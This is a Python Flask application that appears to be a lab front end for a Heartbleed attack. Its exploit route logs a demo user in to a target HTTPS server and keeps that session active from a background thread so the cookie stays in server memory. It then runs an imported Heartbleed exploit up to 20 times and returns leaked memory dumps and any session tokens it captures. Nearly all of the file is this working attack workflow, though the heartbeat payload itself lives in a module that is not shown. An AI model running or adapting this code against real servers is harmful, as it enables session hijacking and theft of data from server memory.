from flask import Flask, render_template, request, jsonify
from heartbleed import run_exploit
import os, ssl, socket, threading, time, urllib.parse

app = Flask(__name__)
TARGET_HOST = os.environ.get("TARGET_HOST", "server")
TARGET_PORT = int(os.environ.get("TARGET_PORT", "443"))


def _https_request(host, port, path, headers="", body=b""):
    """Send a raw HTTPS request using a plain TLS socket (no cert verify)."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        s = socket.create_connection((host, port), timeout=5)
        ss = ctx.wrap_socket(s, server_hostname=host)
        method = "POST" if body else "GET"
        req = (
            f"{method} {path} HTTP/1.0\r\n"
            f"Host: {host}\r\n"
            f"{headers}"
            f"Content-Length: {len(body)}\r\n\r\n"
        ).encode() + body
        ss.sendall(req)
        resp = b""
        while True:
            chunk = ss.recv(4096)
            if not chunk:
                break
            resp += chunk
        ss.close()
        return resp
    except Exception:
        return b""


@app.route("/")
def index():
    return render_template("index.html", target_host=TARGET_HOST, target_port=TARGET_PORT)


@app.route("/exploit", methods=["POST"])
def exploit():
    host = request.json.get("host", TARGET_HOST)
    port = int(request.json.get("port", TARGET_PORT))

    # Step 1 — Log the victim in to plant session token in server heap
    login_body = urllib.parse.urlencode(
        {"username": "alice", "password": "password123"}
    ).encode()
    login_resp = _https_request(
        host, port, "/login",
        headers="Content-Type: application/x-www-form-urlencoded\r\n",
        body=login_body,
    )

    # Extract the session cookie from the login response
    session_token = None
    for line in login_resp.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"session=" in line.lower():
            val = line.split(b"session=", 1)[1].split(b";")[0].decode()
            if val:
                session_token = val
                break

    # Step 2 — Keep making authenticated requests in the background so the
    #           session cookie stays hot in the heap during probing
    stop_flag = threading.Event()

    def keep_alive():
        cookie_hdr = f"Cookie: session={session_token}\r\n" if session_token else ""
        while not stop_flag.is_set():
            _https_request(host, port, "/dashboard", headers=cookie_hdr)
            time.sleep(0.05)

    if session_token:
        t = threading.Thread(target=keep_alive, daemon=True)
        t.start()
        time.sleep(0.1)   # let a few requests land first

    # Step 3 — Probe up to 20 times, stop on first token find
    best = None
    for _ in range(20):
        result = run_exploit(host, port)
        if not best or result["raw_length"] > best["raw_length"]:
            best = result
        if result["found_tokens"]:
            best = result
            break
        time.sleep(0.05)

    stop_flag.set()

    return jsonify({
        "vulnerable":   best["vulnerable"],
        "hex_dump":     best["hex_dump"],
        "found_tokens": best["found_tokens"],
        "raw_length":   best["raw_length"],
        "error":        best["error"],
        "session_planted": session_token is not None,
    })


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
